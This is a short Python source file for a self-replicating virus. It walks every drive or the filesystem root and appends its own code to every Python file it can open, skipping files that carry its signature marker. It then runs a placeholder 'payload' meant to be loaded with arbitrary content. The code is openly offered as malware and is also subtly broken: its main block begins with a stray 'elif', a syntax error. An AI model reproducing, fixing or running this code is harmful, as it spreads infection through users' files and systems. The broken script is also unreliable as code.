signature = "###[NEEDLEPOINT]###" #Change this!!!
from random import choice
import os
import sys

def coin():
    return choice([True, False])

def payload():
    print("HACKED") #Load with desired content
    
def pymode(name,letter):
    f = open(name,"r")
    code = f.read()
    f.close() 
    try:
        if letter:
            string = letter + ":\\"
            os.chdir(string)
            pwd = string
        if not letter:
            os.chdir("/")
            pwd = "/"
    except:
        os.chdir("/")
        pwd = "/"

    for root, subdirs, files in os.walk(pwd):
        for file in files:
            try:
                file = file.strip("\n").strip("\r")
                if file[-3:] == ".py" or file[-4:] == ".pyw":
                    file = os.path.join(root,file)
                    f = open(file,"a+")
                    f.seek(0) #Goto the top of the file
                    if signature in f.read():
                        f.close()
                        continue
                    f.seek(0)
                    f.write(code) #Pwn the file ;)
                    f.write("\n")
                    f.close()
            except:
                continue #Access denied, continue to next file.
    payload()

name = sys.argv[0]
elif name[-3:] == ".py":
    if os.name.lower()=="nt":
        for letter in ["A","B","C","D","E","F","G","H","I","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]:
            pymode(name,letter)
    else:
        pymode(name,None)
